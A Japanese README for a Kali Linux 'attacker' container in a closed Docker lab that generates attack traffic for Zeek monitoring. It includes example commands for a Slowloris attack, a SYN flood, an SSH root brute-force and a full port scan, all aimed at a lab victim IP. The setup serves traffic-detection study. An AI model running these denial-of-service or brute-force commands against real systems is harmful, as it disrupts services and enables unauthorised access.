# attacker コンテナ（Kali Linux）
本コンテナは、Kali Linux をベースにした **攻撃生成用コンテナ** です。  
DoS / Slow HTTP / ポートスキャン / ブルートフォースなど、  
ネットワーク攻撃の挙動を安全な閉域環境内で再現する目的で使用します。

Victim（172.30.0.20）や Zeek（172.30.0.30）との通信は  
`testnet_static` 内に限定され、外部へ攻撃が漏れることはありません。

---

## 📦 インストールされている主要ツール

### 🔹 ネットワーク基本ツール
- `iproute2`（`ip` コマンド）
- `iputils-ping`
- `net-tools`（`ifconfig` / `netstat`）
- `tcpdump`

### 🔹 攻撃用ツール
- **slowhttptest**  
  - Slowloris / Slow Headers 攻撃を生成  
- **hping3**  
  - SYN Flood / 任意 TCP パケット生成  
- **patator**  
  - SSH などの brute-force 試行ツール  
- **nmap**  
  - ポートスキャン・サービスディスカバリ  

### 🔹 テキストエディタ
- vim
- nano

---

## 🐳 コンテナ設定情報

### Dockerfile
```Dockerfile
FROM kalilinux/kali-rolling

RUN apt update && \
    apt install -y \
      iproute2 \
      iputils-ping \
      net-tools \
      tcpdump \
      slowhttptest \
      hping3 \
      patator \
      hydra \
      curl \
      nmap \
      vim \
      nano \
      && apt clean && rm -rf /var/lib/apt/lists/*

# 作業ディレクトリ
WORKDIR /workspace
```


### docker-compose 設定

```yaml
services:
  attacker:
    build: ./attacker
    container_name: attacker
    command: tail -f /dev/null
    cap_add:
      - NET_RAW
      - NET_ADMIN
    networks:
      testnet_static:
        ipv4_address: 172.30.0.10
    volumes:
      - ./attacker/data:/workspace
```

---

## ▶️ コンテナへのアクセス
```bash
docker exec -it attacker bash
```

---

## 📁 `/workspace` ディレクトリについて
* ホストの `./attacker/data/` と同期されています
* 攻撃ログ、pcap、メモ、スクリプトの格納に利用できます

例：
```pgsql
./attacker/data/
└── test1/
    ├── capture.pcap
    └── notes.txt
```

---

## 🧪 使用例（攻撃再現）

### ▼ 1. Ping / 疎通確認
```bash
ping 172.30.0.20
```

### ▼ 2. 正常リクエスト（HTTP GET）
```bash
curl http://172.30.0.20:8080/
```

### ▼ 3. Slowloris（Slow Headers）攻撃
```bash
slowhttptest -c 20 -H -g -i 10 -r 20 -t GET \
  -u http://172.30.0.20:8080/ \
  -x 24 -s 30
```
効果：
* victim の HTTP server が接続枯渇状態に近づく

* Wireshark / Zeek で「ヘッダを送り切らない HTTP GET」が多数観測できる

### ▼ 4. SYN Flood 攻撃
```bash
hping3 -S --flood 172.30.0.20 -p 8080
```
効果：
* victim 側で SYN パケットが大量に届く

* サーバは backlog queue 消費 → 一時的 DoS 状態に

### ▼ 5. SSH brute-force（patator）
```bash
patator ssh_login host=172.30.0.20 user=root password=FILE0 0=/workspace/pass.txt
```

### ▼ 6. 全ポートスキャン
```bash
nmap -sS -p- 172.30.0.20
```

---

## 🔒 注意事項
* **本環境は完全閉域（Docker internal network）で動くように設計されています。**

* 絶対に外部ネットワークへ向けた攻撃に使用しないでください。

* 攻撃の実行は、victim と attacker のコンテナ内に限定してください。

---

## 📝 補足：attacker でよく使う Linux コマンド
| コマンド              | 用途                                |
| ----------------- | --------------------------------- |
| `ip a`            | IPアドレスの確認                         |
| `ss -lnt`         | victim のリッスン中の TCP ポート確認 |
| `tcpdump -i eth0` | ライブパケット観測                      |

---

## 📌 バージョン情報
* Base image: `kalilinux/kali-rolling`

* Tools: slowhttptest / hping3 / patator / nmap / tcpdump / ping など
